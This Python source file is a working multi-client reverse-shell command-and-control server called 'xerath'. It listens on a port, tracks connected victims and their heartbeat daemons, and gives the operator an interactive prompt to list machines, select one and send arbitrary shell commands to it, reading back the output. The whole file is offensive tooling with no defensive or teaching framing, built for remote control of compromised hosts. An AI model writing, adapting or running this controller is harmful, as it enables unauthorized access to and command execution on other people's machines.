import socket
import threading
import time
from queue import Queue
from collections import defaultdict
from args import get_args

HELP_INFO = ' ----------------------------------------------------------------\n' \
            '|Help info: use below commands to find clients or control        |\n' \
            '|list: display connected client and address                      |\n' \
            '|select <client id>: select client and return the reversed shell |\n' \
            '|heartbeat: display the client side heart beat daemon            |\n' \
            '|exit: log out remote client shell                               |\n' \
            ' ----------------------------------------------------------------\n'

class MiniServerThread:
    def __init__(self, port, host="", thread=3, hb_rate=1, max_failure=5, help_info=HELP_INFO ):
        self.number_of_threads = thread
        self.job_number = list(range(1,thread+1))
        self.queue = Queue()
        self.all_connections = {}
        self.hb_connections = {}
        self.port = port
        self.hb_rate = hb_rate
        self.max_failure = max_failure
        self.info = help_info
        self.retry = 5
        self.host = host

    def create_socket(self):
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def bind_socket(self):
        try:
            print("Started server, binding the Port: " + str(self.port))
            self.s.bind((self.host, self.port))
            self.s.listen(self.retry)
        except socket.error as msg:
            print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
            self.bind_socket()

    def clear_all(self):
        for i, (_, _) in self.all_connections.items():
            self.clear_connection(i)

        for i, (_, _) in self.hb_connections.items():
            self.clear_connection(i)

    def accepting_connections(self):
        # close shell connections
        self.clear_all()
        while True:
            try:
                conn, address = self.s.accept()
                self.s.setblocking(1)  # prevents timeout
            except:
                print("Error accepting connections")
            data = None
            try:
                # Two processes both send some initial info to tell if it's daemon or not
                data = conn.recv(1024)
            except:
                print("error in receiving data")
            # empty for shell process, else for heart beat
            if data == b' ':
                new_client = max(self.all_connections) + 1 if self.all_connections else 0
                self.all_connections[new_client] = (conn, address)
                print("Connection has been established :" + address[0], address[1], flush=True)
                print(self.info)
            else:
                new_client = max(self.hb_connections) + 1 if self.hb_connections else 0
                self.hb_connections[new_client] = (conn, address)

    def start_xerath(self):
        while True:
            cmd = input('xerath> ')
            if cmd == 'list':
                self.list_connections()
            elif 'select' in cmd:
                conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(conn)
            elif 'heartbeat' in cmd:
                self.show_client_daemon()
            elif cmd =='':
                continue
            else:
                print("Command not recognized")

    def show_client_daemon(self):
        for i, (conn, address) in self.hb_connections.items():
            results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
            print("----Clients----" + "\n" + results)

    def heart_beat(self):
        hb_failures = defaultdict(int)
        print_true = True
        while True:
            if self.hb_connections and print_true:
                print("Start monitoring client connection in daemon..")
                print_true = False
            time.sleep(self.hb_rate)
            hb_keys = list(self.hb_connections.keys())
            for i in hb_keys:
                try:
                    self.hb_connections[i][0].send(str.encode(' '))
                except:
                    hb_failures[i] += 1
                if hb_failures[i] > self.max_failure:
                    msg = "\nclient {}: no response for {}s "
                    print(msg.format(i, hb_failures[i] * self.hb_rate ))
                    print("disconnect client", i, end='\n')
                    self.clear_connection(i)
                    hb_failures[i] = 0

    def clear_connection(self, i):
        self.all_connections[i][0].close()
        del self.all_connections[i]
        self.hb_connections[i][0].close()
        del self.hb_connections[i]

    def list_connections(self):
        to_remove = []
        for i, (conn, address) in self.all_connections.items():
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                to_remove.append(i)
                continue
            results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
            print("----Clients----\n{}".format(results))
        for i in to_remove:
            self.clear_connection(i)

    # Selecting the target
    def get_target(self, cmd):
        try:
            target = cmd.replace('select ', '')  # target = id
            target = int(target)
            conn, address = self.all_connections[target]
            print("You are now connected to :" + str(address[0]))
            print(str(address[0]) + ">", end="")
            return conn
        except:
            print("Selection not valid")
            return None

    @staticmethod
    def send_target_commands(conn):
        while True:
            try:
                cmd = input()
                if cmd == 'exit':
                    break
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")
            except:
                print("Error sending commands")
                break

    def create_workers(self):
        for _ in range(self.number_of_threads):
            t = threading.Thread(target=self.work)
            # set worker as daemon; daemon terminates after main ends
            t.setDaemon(True)
            t.start()

    def work(self):
        while True:
            x = self.queue.get()
            if x == 1:
                self.create_socket()
                self.bind_socket()
                self.accepting_connections()
            if x == 2:
                self.start_xerath()
            if x == 3:
                self.heart_beat()
            self.queue.task_done()

    def create_jobs(self):
        for x in self.job_number:
            self.queue.put(x)
        self.queue.join()





if __name__ == '__main__':

    args = get_args()
    server = MiniServerThread(port=args.port, host=args.host)
    server.create_workers()
    server.create_jobs()